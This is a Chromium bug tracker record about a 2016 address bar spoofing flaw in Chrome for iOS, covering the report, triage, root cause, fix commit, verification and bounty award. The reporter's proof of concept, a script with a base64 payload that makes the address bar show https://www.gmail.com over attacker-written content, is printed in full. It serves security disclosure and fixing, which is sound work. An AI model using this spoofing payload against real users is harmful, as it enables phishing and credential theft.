# Security: Chrome Address Bar URL spoofing on IOS

| Field | Value |
|-------|-------|
| **Issue ID** | [40084644](https://issues.chromium.org/issues/40084644) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Unknown |
| **Platforms** | iOS |
| **Reporter** | xi...@gmail.com |
| **Assignee** | eu...@chromium.org |
| **Created** | 2016-06-22 |
| **Bounty** | $3,000.00 |

## Description

Agent:
Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_3 like Mac OS X) AppleWebKit/601.1 (KHTML, like Gecko) CriOS/51.0.2704.64 Mobile/13G21 Safari/601.1.4


DESCRIPTION:

Chrome Address Bar URL spoofing on IOS

POC:

http://xisigr.com/test/spoof/chrome/1.html
http://xisigr.com/test/spoof/chrome/2.html



## Attachments

- [spoof-1.jpg](attachments/spoof-1.jpg) (image/jpeg, 96.3 KB)
- [spoof-2.jpg](attachments/spoof-2.jpg) (image/jpeg, 46.6 KB)

## Timeline

### xi...@gmail.com (2016-06-22)

POC:
<script>

payload="PGJvZHk+PC9ib2R5Pg0KPHNjcmlwdD4NCiAgICB2YXIgbGluayA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2EnKTsNCiAgICBsaW5rLmhyZWYgPSAnaHR0cHM6Ly9nbWFpbC5jb206Oic7DQogICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChsaW5rKTsNCiAgICBsaW5rLmNsaWNrKCk7DQo8L3NjcmlwdD4=";

function pwned() {
    var t = window.open('https://www.gmail.com', 'aaaa');
    t.document.write(atob(payload));
    t.document.write("<h1>Address bar says https://www.gmail.com - this is NOT https://www.gmail.com</h1>");
    
}

</script>
<a href="https://hack.com::/"  target="aaaa" onclick="setTimeout('pwned()','500')">click me</a><br>

base64 payload code:
<body></body>
<script>
    var link = document.createElement('a');
    link.href = 'https://gmail.com::';
    document.body.appendChild(link);
    link.click();
</script>

### do...@chromium.org (2016-06-22)

This appears to be the same idea as https://crbug.com/chromium/599956. Since the page is actually loaded at about:blank, trying to grab cookies or the like won't work. +palmer to confirm

[Monorail components: Security>UX]

### pa...@chromium.org (2016-06-22)

The attack payload is:

```
<body></body>
<script>
    var link = document.createElement('a');
    link.href = 'https://gmail.com::';
    document.body.appendChild(link);
    link.click();
</script>
```

According to the severity guidelines (https://www.chromium.org/developers/severity-guidelines): "An address bar spoof where only certain URLs can be displayed, or with other mitigating factors (265221)." would be Medium. But this PoC is not subject to any such mitigations, so it's a very nice phishing attack.

eugenebut, pkl, pinkerton: Could one of you please identify an appropriate owner for this bug? Thanks!

### eu...@chromium.org (2016-06-22)

I am a good owner for this bug.

### eu...@chromium.org (2016-06-22)

[Empty comment from Monorail migration]

### eu...@chromium.org (2016-06-22)

[Comment Deleted]

### eu...@chromium.org (2016-06-22)

[Empty comment from Monorail migration]

### eu...@chromium.org (2016-06-22)

[Empty comment from Monorail migration]

### eu...@chromium.org (2016-06-22)

Here is what's actually happening:
1.) decidePolicyForNavigationAction: called with 'https://gmail.com::' and chrome allows the load
2.) didStartProvisionalNavigation: called with 'https://gmail.com::' which chrome adds as a pending entry. 
3.) didCommitNavigation: called with 'about:blank' but chrome commits pending entry ('https://gmail.com::') and promotes it as a last committed URL
4.) didFinishNavigation: called

### sh...@chromium.org (2016-06-23)

[Empty comment from Monorail migration]

### eu...@chromium.org (2016-06-24)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-24)

[Empty comment from Monorail migration]

### eu...@chromium.org (2016-06-24)

CL: https://codereview.chromium.org/2086333003/

### eu...@chromium.org (2016-06-24)

[Empty comment from Monorail migration]

### ca...@chromium.org (2016-06-24)

[Empty comment from Monorail migration]

### bu...@chromium.org (2016-06-24)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/5967e8c0fe0b1e11cc09d6c88304ec504e909fd5

commit 5967e8c0fe0b1e11cc09d6c88304ec504e909fd5
Author: Eugene But <eugenebut@google.com>
Date: Fri Jun 24 17:52:58 2016

[ios] Do not commit invalid URLs during web load.

BUG=622183

Review-Url: https://codereview.chromium.org/2086333003
Cr-Commit-Position: refs/heads/master@{#401761}
(cherry picked from commit c2d2b0f2f74dad0bdef196cf1657f0d584cbe3a7)

Review URL: https://codereview.chromium.org/2096023002 .

Cr-Commit-Position: refs/branch-heads/2743@{#467}
Cr-Branched-From: 2b3ae3b8090361f8af5a611712fc1a5ab2de53cb-refs/heads/master@{#394939}

[modify] https://crrev.com/5967e8c0fe0b1e11cc09d6c88304ec504e909fd5/ios/web/web_state/ui/crw_web_controller.mm


### ca...@chromium.org (2016-06-24)

This does not need to be merged to M51

### aw...@chromium.org (2016-06-27)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-06-27)

Thanks for your report. We'll consider your report under the Chrome Reward Program for a security cash reward - full details here: https://www.google.com/about/appsecurity/chrome-rewards/

We'll update you once we have a decision. Feel free to check in with me in a few weeks if you haven't heard back, either by updating this bug or reaching out to me at awhalley@

### ca...@chromium.org (2016-06-27)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-07-14)

Congratulations, the panel decided to award $3,000 for this bug!  Our finance team will be in touch within a few weeks to arrange the details.

<boilerplate>
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an established charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.</boilerplate>


### aw...@chromium.org (2016-07-14)

[Empty comment from Monorail migration]

### xi...@gmail.com (2016-07-14)

Thanks! Credit as "xisigr of Tencent's Xuanwu Lab" would be good.

### aw...@chromium.org (2016-07-14)

[Empty comment from Monorail migration]

### sr...@chromium.org (2016-07-20)

I ran both POC's reported in https://crbug.com/chromium/622183#c0 and the issue is now fixed.
about:blank is displayed in both the cases.
Verified on M52.0.2743.82 beta, M53.0.2785.22 beta versions.
Devices: iPad Air2, iPad mini, iPhone6 plus, iPhone6s.
iOS: 9.3.2, 10.0

One observation here is: Both of these tests are not reproducible on the current stable version of Chrome (M51) on iOS10 (i.e even without fix).

### aw...@chromium.org (2016-07-25)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-08-29)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-09-30)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### la...@chromium.org (2016-12-09)

Security>UX component is deprecated in favor of the Team-Security-UX label

[Monorail components: -Security>UX]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/622183?no_tracker_redirect=1

[Auto-CCs applied]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40084644)*
